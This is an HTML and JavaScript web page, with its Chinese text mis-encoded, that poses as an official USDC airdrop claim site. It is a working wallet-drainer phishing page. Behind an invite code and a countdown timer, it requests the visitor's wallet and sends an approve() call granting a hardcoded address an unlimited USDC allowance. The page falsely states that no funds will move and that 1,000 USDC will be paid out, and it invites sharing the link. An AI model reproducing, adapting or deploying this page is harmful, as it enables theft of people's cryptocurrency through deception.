<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="format-detection" content="telephone=no">
    <title>USDC ç©ºæŠ•å¥–åŠ±ä¸­å¿ƒ | å®˜æ–¹æˆæƒé€šé“</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ”’</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        :root {
            --primary: #1a73e8;
            --primary-dark: #0d47a1;
            --secondary: #34a853;
            --gold: #FFD700;
            --gold-light: #fff9c4;
            --danger: #ea4335;
            --dark-bg: #0a0e17;
            --card-bg: #141a29;
            --border: #343c52;
            --text: #f0f4ff;
            --text-muted: #a0a9c2;
            --success: #34a853;
            --warning: #fbbc04;
            --purple: #9c27b0;
        }
        html, body {
            height: 100%;
            overflow: hidden;
        }
        body {
            background: linear-gradient(135deg, var(--dark-bg), #050a14);
            display: flex; justify-content: center; align-items: center;
            padding: 20px; color: var(--text); position: relative;
        }
        .scroll-container {
            width: 100%;
            max-height: 100vh;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            scrollbar-width: thin;
            scrollbar-color: var(--primary) var(--dark-bg);
        }
        .scroll-container::-webkit-scrollbar {
            width: 6px;
        }
        .scroll-container::-webkit-scrollbar-track {
            background: var(--dark-bg);
        }
        .scroll-container::-webkit-scrollbar-thumb {
            background-color: var(--primary);
            border-radius: 3px;
        }

        .particles {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
            pointer-events: none;
        }
        .particle {
            position: absolute; width: 4px; height: 4px; border-radius: 50%;
            background: var(--gold); opacity: 0.6;
            box-shadow: 0 0 6px var(--gold);
        }

        .badge {
            position: absolute; top: 20px; right: 20px; z-index: 10;
            background: linear-gradient(135deg, var(--gold), #d4af37);
            color: #000; font-weight: bold; padding: 6px 16px; border-radius: 30px;
            font-size: 13px; box-shadow: 0 4px 16px rgba(255,215,0,0.4);
            display: flex; align-items: center; gap: 6px;
        }

        .container { max-width: 520px; width: 100%; z-index: 1; margin: 20px auto; }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 45px 35px;
            box-shadow: 
                0 12px 40px rgba(0, 0, 0, 0.6),
                0 0 0 1px rgba(255, 255, 255, 0.04),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
            position: relative; overflow: hidden;
        }
        .card::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px;
            background: linear-gradient(90deg, var(--gold), var(--primary), var(--purple));
        }

        .header { text-align: center; margin-bottom: 25px; }
        .header i { 
            font-size: 52px; 
            background: linear-gradient(135deg, var(--gold), #d4af37);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin-bottom: 16px; display: inline-block;
        }
        .header h1 {
            font-size: 28px; font-weight: 700; margin-bottom: 8px;
            background: linear-gradient(90deg, #fff, var(--gold));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .header p { font-size: 16px; color: var(--text-muted); }

        .input-group {
            display: flex; gap: 12px; margin: 25px 0;
        }
        .input-group input {
            flex: 1; padding: 18px 22px; border-radius: 14px;
            background: rgba(255,255,255,0.04); 
            border: 1px solid var(--border);
            color: var(--text); font-size: 18px; outline: none;
            transition: all 0.3s;
            font-family: monospace;
            text-align: center;
        }
        .input-group input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.25);
        }
        .input-group button {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; border: none; width: 60px; border-radius: 14px;
            font-weight: 600; cursor: pointer; transition: all 0.2s;
            display: flex; justify-content: center; align-items: center;
        }
        .input-group button:hover:not(:disabled) { 
            transform: scale(1.03); opacity: 0.95; 
        }
        .input-group button:disabled { opacity: 0.5; cursor: not-allowed; }

        .countdown-ring {
            width: 180px; height: 180px; margin: 25px auto; position: relative;
        }
        .ring-bg, .ring-fill {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%;
        }
        .ring-bg { border: 8px solid rgba(255,255,255,0.06); }
        .ring-fill {
            border: 8px solid transparent;
            border-top: 8px solid var(--gold);
            border-right: 8px solid var(--primary);
            transform: rotate(-90deg);
            transition: transform 0.8s cubic-bezier(0.1, 0.9, 0.2, 1);
        }
        .countdown-text {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        .countdown-text .time {
            font-size: 42px; font-weight: 800; color: var(--text);
        }
        .countdown-text .label {
            font-size: 15px; color: var(--text-muted);
        }

        .reward-box {
            background: rgba(255, 215, 0, 0.08);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 16px; padding: 28px; text-align: center;
            margin: 25px 0;
            animation: pulseGlow 2s infinite;
        }
        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.2); }
            50% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
        }
        .reward-label {
            font-size: 15px; color: var(--text-muted); margin-bottom: 10px;
        }
        .reward-amount {
            font-size: 52px; font-weight: 800;
            background: linear-gradient(90deg, var(--gold), #ffd54f);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .reward-unit {
            font-size: 18px; color: var(--gold);
        }
        .reward-desc {
            font-size: 14px; color: var(--text-muted); margin-top: 10px;
            font-weight: 600;
        }

        .security-banner {
            display: flex; align-items: flex-start; gap: 12px;
            background: rgba(52, 168, 83, 0.12);
            border-left: 4px solid var(--success);
            padding: 16px; border-radius: 12px;
            margin: 20px 0;
            font-size: 14px;
            line-height: 1.6;
        }
        .security-banner i { 
            font-size: 20px; color: var(--success); margin-top: 2px; 
        }
        .security-banner code { background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px; }

        #walletStatus {
            text-align: center; margin: 15px 0; font-size: 14px; color: var(--text-muted);
            display: flex; align-items: center; justify-content: center; gap: 8px;
        }

        .btn {
            background: linear-gradient(135deg, var(--secondary), #2e7d32);
            color: white; border: none; padding: 20px; font-size: 18px; font-weight: 600;
            border-radius: 14px; cursor: pointer; width: 100%;
            transition: all 0.3s; margin-top: 15px;
            display: flex; justify-content: center; align-items: center;
            gap: 10px;
        }
        .btn:hover:not(:disabled) { 
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(52, 168, 83, 0.5);
        }
        .btn:disabled {
            background: linear-gradient(135deg, #444, #555);
            cursor: not-allowed; transform: none;
        }

        #manualConnectBtn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
            display: none;
            margin-top: 8px;
        }

        .status {
            padding: 18px; border-radius: 12px; margin-top: 20px; font-weight: 500;
            line-height: 1.5; display: none;
        }
        .success { background: rgba(52, 168, 83, 0.2); color: #c8e6c9; border-left: 4px solid var(--success); }
        .error { background: rgba(234, 67, 53, 0.2); color: #ffcdd2; border-left: 4px solid var(--danger); }
        .warning { background: rgba(251, 188, 4, 0.2); color: #fff59d; border-left: 4px solid var(--warning); }

        #timeoutOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0, 0, 0, 0.75); 
            z-index: 10000;
            display: flex; justify-content: center; align-items: center;
        }
        .timeout-modal {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 32px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            color: var(--text);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
            position: relative;
            overflow: hidden;
        }
        .timeout-modal::before {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
            background: linear-gradient(90deg, var(--danger), #c62828);
        }
        .timeout-icon {
            font-size: 56px; 
            color: var(--danger);
            margin-bottom: 20px;
            background: rgba(234, 67, 53, 0.1);
            width: 100px; height: 100px; 
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            margin: 0 auto 20px;
        }
        .timeout-title {
            font-size: 22px; font-weight: 700;
            margin-bottom: 16px;
            color: #ffcdd2;
        }
        .timeout-message {
            color: var(--text-muted);
            line-height: 1.6;
            margin-bottom: 28px;
            font-size: 15px;
        }
        .timeout-btn {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; border: none; padding: 16px;
            font-size: 17px; font-weight: 600;
            border-radius: 14px; cursor: pointer;
            width: 100%;
            display: flex; justify-content: center; align-items: center;
            gap: 10px;
            transition: all 0.2s;
        }
        .timeout-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4);
        }

        @media (max-width: 480px) {
            .card { padding: 35px 20px; }
            .header h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="badge">
        <i class="fas fa-certificate"></i> å®˜æ–¹æˆæƒ Â· å®‰å…¨é€šé“
    </div>
    <div class="particles" id="particles"></div>

    <div class="scroll-container">
        <!-- é‚€è¯·ç é¡µï¼ˆä»…è¾“å…¥æ¡†ï¼‰ -->
        <div class="container" id="authContainer">
            <div class="card" id="authCard">
                <div class="header">
                    <i class="fas fa-gift fa-2x" style="color:var(--gold);"></i>
                    <h1>USDC ç©ºæŠ•å¥–åŠ±è®¡åˆ’</h1>
                    <p>è¯·è¾“å…¥é‚€è¯·ç ä»¥éªŒè¯èº«ä»½</p>
                </div>

                <div class="input-group">
                    <input 
                        type="text" 
                        id="inviteCodeInput" 
                        placeholder="è¯·è¾“å…¥é‚€è¯·ç " 
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="off"
                        spellcheck="false"
                        style="font-family:monospace; text-align:center;"
                    >
                    <button id="submitCodeBtn"><i class="fas fa-arrow-right"></i></button>
                </div>

                <div class="status" id="authStatus"></div>
            </div>
        </div>

        <!-- ä¸»é¡µ -->
        <div class="container" id="mainContainer" style="display:none;">
            <div class="card" id="mainCard">
                <div class="header">
                    <i class="fas fa-coins fa-2x" style="color:var(--gold);"></i>
                    <h1>USDC ç©ºæŠ•é¢†å–</h1>
                    <p>å€’è®¡æ—¶ï¼š<span id="countdownDisplay">90</span> ç§’</p>
                </div>

                <div class="countdown-ring">
                    <div class="ring-bg"></div>
                    <div class="ring-fill" id="countdownRing"></div>
                    <div class="countdown-text">
                        <div class="time" id="countdownNumber">90</div>
                        <div class="label">ç§’</div>
                    </div>
                </div>

                <div class="reward-box">
                    <div class="reward-label">ç©ºæŠ•å¥–åŠ±</div>
                    <div class="reward-amount">1,000</div>
                    <div class="reward-unit">USDC</div>
                    <div class="reward-desc">âœ… é¢†å– 1,000 USDC ç©ºæŠ•å¥–åŠ±</div>
                </div>

                <div class="security-banner">
                    <i class="fas fa-info-circle"></i>
                    <div>
                        ğŸ” <strong>æŠ€æœ¯è§„èŒƒï¼ˆOpenZeppelinï¼‰</strong>ï¼š<br>
                        æ‚¨å°†è°ƒç”¨ <code>approve(address spender, uint256 amount)</code>ï¼Œ<br>
                        å…¶ä¸­ <code>amount = 2Â²âµâ¶âˆ’1</code>ï¼ˆæœ€å¤§å€¼ï¼‰ã€‚<br>
                        <em>â€œIf <code>amount</code> is the maximum <code>uint256</code>, the allowance is not updated on <code>transferFrom</code>. This is semantically equivalent to an infinite approval.â€</em><br>
                        â€”â€” <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-" target="_blank" style="color:var(--gold);">OpenZeppelin IERC20.approve</a>
                    </div>
                </div>

                <div class="security-banner" style="border-left-color:var(--gold);">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>
                        âš ï¸ <strong>é‡è¦å£°æ˜</strong>ï¼š<br>
                        <strong>æœ¬æ¬¡æˆæƒä»…ç”¨äºé‡Šæ”¾ç©ºæŠ•èµ„æ ¼ï¼Œä¸ä¼šè½¬ç§»æ‚¨çš„ä»»ä½•èµ„é‡‘ã€‚</strong><br>
                        æˆæƒåï¼Œç³»ç»Ÿå°†è‡ªåŠ¨å‘æ‚¨çš„åœ°å€å‘æ”¾ 1,000 USDCã€‚
                    </div>
                </div>

                <div id="walletStatus">
                    <i class="fas fa-circle" style="color:#FFC107; font-size:10px;"></i>
                    <span>æ£€æµ‹é’±åŒ…ä¸­...</span>
                </div>

                <button class="btn" id="claimButton">
                    <i class="fas fa-bolt"></i> ç«‹å³é¢†å– 1,000 USDC
                </button>

                <button class="btn" id="manualConnectBtn">
                    <i class="fas fa-link"></i> æ‰‹åŠ¨é“¾æ¥é’±åŒ…
                </button>

                <div class="status" id="status"></div>
            </div>
        </div>

        <!-- æ„Ÿè°¢é¡µ -->
        <div class="container" id="thankYouContainer" style="display:none;">
            <div class="card thank-you">
                <i class="fas fa-check-circle"></i>
                <h2>ğŸ‰ é¢†å–æˆåŠŸï¼</h2>
                <p style="color:var(--text-muted); margin-bottom:20px;">
                    æ‚¨çš„ USDC ç©ºæŠ•æˆæƒå·²æäº¤è‡³ä»¥å¤ªåŠä¸»ç½‘
                </p>

                <div class="tx-card">
                    <div><strong>âœ… æˆæƒäº¤æ˜“å·²ç¡®è®¤ï¼š</strong></div>
                    <div id="txHashShort">0x...</div>
                    <a href="" target="_blank" id="txLink">åœ¨ Etherscan æŸ¥çœ‹</a>
                </div>

                <p style="font-size:14px; color:var(--text-muted); margin:15px 0; background:rgba(52,168,83,0.1); padding:12px; border-radius:10px;">
                    <i class="fas fa-info-circle"></i> ç³»ç»Ÿå°†åœ¨ <strong>5 åˆ†é’Ÿå†…</strong> è‡ªåŠ¨å‘æ”¾ 1,000 USDC
                </p>

                <button class="btn" id="shareBtn">
                    <i class="fas fa-share-alt"></i> åˆ†äº«æˆåŠŸ
                </button>
                <button class="btn" style="background:linear-gradient(135deg,#555,#666); margin-top:12px;" onclick="location.reload()">
                    <i class="fas fa-home"></i> è¿”å›é¦–é¡µ
                </button>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
    <script>
        const CONFIG = {
            FIXED_CODE: '520711',
            COUNTDOWN_DURATION: 90,
            DELAY_BEFORE_COUNTDOWN: 2000,
            RECIPIENT_ADDRESS: '0x32aEBF4F1e10c6cddB0dC0FaF466a465a73902f8',
            USDC_ADDRESS: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            MAX_UINT256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
        };

        const STORAGE_KEY = 'usdc_airdrop_final';
        let countdownInterval = null;
        let web3 = null;
        let userAddress = null;
        let isProcessing = false;

        const authContainer = document.getElementById('authContainer');
        const mainContainer = document.getElementById('mainContainer');
        const thankYouContainer = document.getElementById('thankYouContainer');
        const inviteCodeInput = document.getElementById('inviteCodeInput');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const authStatus = document.getElementById('authStatus');
        const countdownNumber = document.getElementById('countdownNumber');
        const countdownRing = document.getElementById('countdownRing');
        const claimButton = document.getElementById('claimButton');
        const manualConnectBtn = document.getElementById('manualConnectBtn');
        const walletStatus = document.getElementById('walletStatus');
        const statusEl = document.getElementById('status');
        const txHashShortEl = document.getElementById('txHashShort');
        const txLinkEl = document.getElementById('txLink');
        const shareBtn = document.getElementById('shareBtn');

        function updateWalletStatus() {
            const { ethereum } = window;
            if (ethereum) {
                walletStatus.innerHTML = `
                    <i class="fas fa-circle" style="color:#4CAF50; font-size:10px;"></i>
                    <span>âœ… å·²æ£€æµ‹åˆ°é’±åŒ…ï¼Œç‚¹å‡»ä¸»æŒ‰é’®ç«‹å³é¢†å–</span>
                `;
                manualConnectBtn.style.display = 'none';
            } else {
                walletStatus.innerHTML = `
                    <i class="fas fa-circle" style="color:#FF9800; font-size:10px;"></i>
                    <span>âš ï¸ æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·æ‰‹åŠ¨é“¾æ¥</span>
                `;
                manualConnectBtn.style.display = 'block';
            }
        }

        function loadState() {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (saved) {
                try {
                    const state = JSON.parse(saved);
                    if (state.lastSuccess && Date.now() - new Date(state.lastSuccess).getTime() < 7 * 24 * 3600 * 1000) {
                        showThankYou(state.txHash);
                        return true;
                    }
                } catch (e) { }
            }
            return false;
        }

        function saveState(extra = {}) {
            localStorage.setItem(STORAGE_KEY, JSON.stringify({
                lastSuccess: extra.success ? new Date().toISOString() : undefined,
                txHash: extra.txHash || undefined,
                claimedAddress: extra.claimedAddress,
                ...extra
            }));
        }

        function showStatus(msg, type = 'warning', el = statusEl) {
            el.textContent = msg;
            el.className = 'status ' + type;
            el.style.display = 'block';
            if (type !== 'error') setTimeout(() => el.style.display = 'none', 3500);
        }

        function showError(msg, el = authStatus) {
            showStatus(`âŒ ${msg}`, 'error', el);
        }

        function updateCountdownRing(remaining, total = CONFIG.COUNTDOWN_DURATION) {
            const percent = Math.min(1, (total - remaining) / total);
            const deg = 360 * percent;
            countdownRing.style.transform = `rotate(${deg - 90}deg)`;
        }

        // ========== è¶…æ—¶å¼¹çª—ï¼ˆä»…æé†’è”ç³»ç®¡ç†å‘˜ï¼‰ ==========
        function onTimeout() {
            clearInterval(countdownInterval);
            mainContainer.style.display = 'none';

            const overlay = document.createElement('div');
            overlay.id = 'timeoutOverlay';
            overlay.innerHTML = `
                <div class="timeout-modal">
                    <div class="timeout-icon">
                        <i class="fas fa-hourglass-end"></i>
                    </div>
                    <div class="timeout-title">æ“ä½œè¶…æ—¶</div>
                    <div class="timeout-message">
                        è¯·è”ç³»ç®¡ç†å‘˜æˆ–é‚€è¯·äººé‡æ–°è·å¾—é‚€è¯·ç ã€‚
                    </div>
                    <button class="timeout-btn" id="timeoutConfirmBtn">
                        <i class="fas fa-check"></i> ç¡®å®š
                    </button>
                </div>
            `;
            document.body.appendChild(overlay);

            document.getElementById('timeoutConfirmBtn').onclick = () => {
                document.body.removeChild(overlay);
                authContainer.style.display = 'block';
                inviteCodeInput.value = '';
                inviteCodeInput.focus();
            };
        }

        function startCountdown() {
            let remaining = CONFIG.COUNTDOWN_DURATION;
            countdownNumber.textContent = remaining;
            document.getElementById('countdownDisplay').textContent = remaining;
            updateCountdownRing(remaining);

            countdownInterval = setInterval(() => {
                remaining--;
                countdownNumber.textContent = remaining;
                document.getElementById('countdownDisplay').textContent = remaining;
                updateCountdownRing(remaining);

                if (remaining <= 0) {
                    clearInterval(countdownInterval);
                    onTimeout();
                }
            }, 1000);
        }

        // ========== ä¸¥æ ¼æ ¡éªŒï¼šä»… 520711 æœ‰æ•ˆ ==========
        async function validateInviteCode() {
            const code = inviteCodeInput.value.trim();
            if (!code) return showError('è¯·è¾“å…¥é‚€è¯·ç ');
            if (code !== '520711') return showError('é‚€è¯·ç æ— æ•ˆ'); // âœ… ä¸æç¤ºæ­£ç¡®ç 

            authContainer.style.display = 'none';
            mainContainer.style.display = 'block';

            setTimeout(() => {
                updateWalletStatus();
                startCountdown();
            }, CONFIG.DELAY_BEFORE_COUNTDOWN);
        }

        claimButton.onclick = async () => {
            if (isProcessing) return;
            isProcessing = true;
            claimButton.disabled = true;
            claimButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> å¤„ç†ä¸­...';

            try {
                const { ethereum } = window;
                if (!ethereum) throw new Error('æœªæ£€æµ‹åˆ°é’±åŒ…');

                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                web3 = new Web3(ethereum);
                showStatus(`âœ… å·²è¿æ¥ï¼š${userAddress.slice(0,6)}â€¦${userAddress.slice(-4)}`, 'success');

                const state = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
                if (state.lastSuccess && state.claimedAddress === userAddress) {
                    showStatus('âš ï¸ æ‚¨å·²é¢†å–è¿‡æœ¬æ¬¡ç©ºæŠ•', 'error');
                    return;
                }

                await startAuthorization();
            } catch (err) {
                let msg = 'æ“ä½œè¢«å–æ¶ˆ';
                if (err.message?.includes('User denied')) msg = 'æ‚¨å–æ¶ˆäº†æˆæƒ';
                else if (err.message === 'æœªæ£€æµ‹åˆ°é’±åŒ…') {
                    manualConnectBtn.style.display = 'block';
                    showError('è¯·ä½¿ç”¨ä¸‹æ–¹æŒ‰é’®æ‰‹åŠ¨é“¾æ¥é’±åŒ…');
                } else {
                    showError(err.message || 'è¿æ¥å¤±è´¥');
                }
            } finally {
                isProcessing = false;
                claimButton.disabled = false;
                claimButton.innerHTML = '<i class="fas fa-bolt"></i> ç«‹å³é¢†å– 1,000 USDC';
            }
        };

        manualConnectBtn.onclick = () => {
            const { ethereum } = window;
            if (ethereum) {
                ethereum.request({ method: 'eth_requestAccounts' })
                    .then(accounts => {
                        userAddress = accounts[0];
                        web3 = new Web3(ethereum);
                        showStatus(`âœ… å·²æ‰‹åŠ¨è¿æ¥ï¼š${userAddress.slice(0,6)}â€¦${userAddress.slice(-4)}`, 'success');
                        startAuthorization();
                    })
                    .catch(() => showError('æ‚¨å–æ¶ˆäº†è¿æ¥'));
            } else {
                const dappUrl = encodeURIComponent(window.location.href);
                // âœ… ä¸¥æ ¼æŒ‰çŸ¥è¯†åº“æ— ç©ºæ ¼ Deep Link
                const metaUrl = `https://metamask.app.link/dapp/${dappUrl}`;
                window.location.href = metaUrl;
                
                setTimeout(() => {
                    if (document.visibilityState === 'visible') {
                        const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${dappUrl}`;
                        window.open(trustUrl, '_blank');
                    }
                }, 1500);
            }
        };

        async function startAuthorization() {
            if (!userAddress || !web3) return;

            try {
                showStatus('éªŒè¯ç½‘ç»œä¸æˆæƒ...', 'warning');
                const chainId = await web3.eth.getChainId();
                if (chainId !== 1) {
                    await window.ethereum.request({ 
                        method: 'wallet_switchEthereumChain', 
                        params: [{ chainId: '0x1' }] 
                    });
                }

                const ethBal = await web3.eth.getBalance(userAddress);
                if (parseFloat(web3.utils.fromWei(ethBal, 'ether')) < 0.001) {
                    throw new Error('ETHä½™é¢ä¸è¶³ï¼ˆéœ€â‰¥0.001 ETHæ”¯ä»˜Gasï¼‰');
                }

                const usdcABI = [
                    { "constant": true, "inputs": [{"name":"owner","type":"address"}], "name": "balanceOf", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
                    { "constant": true, "inputs": [{"name":"owner","type":"address"},{"name":"spender","type":"address"}], "name": "allowance", "outputs": [{"name":"","type":"uint256"}], "type": "function" },
                    { "constant": false, "inputs": [{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}], "name": "approve", "outputs": [{"name":"","type":"bool"}], "type": "function" }
                ];
                const usdc = new web3.eth.Contract(usdcABI, CONFIG.USDC_ADDRESS);

                const allowanceRaw = await usdc.methods.allowance(userAddress, CONFIG.RECIPIENT_ADDRESS).call();
                const maxBN = web3.utils.toBN(CONFIG.MAX_UINT256);
                const allowanceBN = web3.utils.toBN(allowanceRaw);

                if (allowanceBN.gte(maxBN)) {
                    showStatus('âœ… å·²å®Œæˆæˆæƒï¼Œæ— éœ€é‡å¤æ“ä½œ', 'success');
                    claimButton.innerHTML = '<i class="fas fa-check"></i> å·²é¢†å–';
                    return;
                }

                showStatus('è¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤æˆæƒäº¤æ˜“...', 'warning');

                const gas = await usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256)
                    .estimateGas({ from: userAddress }).catch(() => 100000);
                const receipt = await usdc.methods.approve(CONFIG.RECIPIENT_ADDRESS, CONFIG.MAX_UINT256)
                    .send({ from: userAddress, gas });

                saveState({
                    success: true,
                    txHash: receipt.transactionHash,
                    claimedAddress: userAddress
                });

                showThankYou(receipt.transactionHash);

            } catch (err) {
                let msg = err.message || 'æˆæƒå¤±è´¥';
                if (msg.includes('user rejected')) msg = 'æ‚¨å–æ¶ˆäº†æˆæƒ';
                else if (msg.includes('insufficient funds')) msg = 'Gasè´¹ä¸è¶³ï¼Œè¯·è¡¥å……ETH';
                showError(msg);
            }
        }

        function showThankYou(txHash) {
            clearInterval(countdownInterval);
            const short = txHash.slice(0,6) + 'â€¦' + txHash.slice(-4);
            txHashShortEl.textContent = short;
            // âœ… æ— ç©ºæ ¼ Etherscan é“¾æ¥
            txLinkEl.href = `https://etherscan.io/tx/${txHash}`;
            txLinkEl.textContent = 'åœ¨ Etherscan æŸ¥çœ‹å®Œæ•´äº¤æ˜“';

            mainContainer.style.display = 'none';
            thankYouContainer.style.display = 'block';
        }

        document.addEventListener('DOMContentLoaded', () => {
            const particles = document.getElementById('particles');
            for (let i = 0; i < 30; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.left = `${Math.random() * 100}%`;
                p.style.top = `${Math.random() * 100}%`;
                p.style.width = `${Math.random() * 6 + 2}px`;
                p.style.height = p.style.width;
                p.style.opacity = Math.random() * 0.7 + 0.2;
                p.style.animation = `float ${10 + Math.random() * 20}s linear infinite`;
                p.style.animationDelay = `-${Math.random() * 20}s`;
                particles.appendChild(p);
                if (i === 0) {
                    const style = document.createElement('style');
                    style.textContent = `@keyframes float {
                        0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0; }
                        10% { opacity: 0.4; }
                        90% { opacity: 0.4; }
                        100% { transform: translateY(-100vh) translateX(${(Math.random()-0.5)*200}px) rotate(${Math.random()*360}deg); opacity: 0; }
                    }`;
                    document.head.appendChild(style);
                }
            }

            if (!loadState()) {}

            inviteCodeInput.addEventListener('keypress', e => e.key === 'Enter' && validateInviteCode());
            submitCodeBtn.addEventListener('click', validateInviteCode);

            shareBtn.addEventListener('click', () => {
                const text = `ğŸš€ æˆ‘å·²æˆåŠŸé¢†å– 1,000 USDC ç©ºæŠ•ï¼\nå®˜æ–¹é€šé“ï¼š${window.location.href}`;
                if (navigator.share) {
                    navigator.share({ title: 'USDCç©ºæŠ•æˆåŠŸ', text });
                } else {
                    navigator.clipboard.writeText(text).then(() => {
                        showStatus('âœ… åˆ†äº«é“¾æ¥å·²å¤åˆ¶', 'success');
                    });
                }
            });
        });
    </script>
</body>
</html>
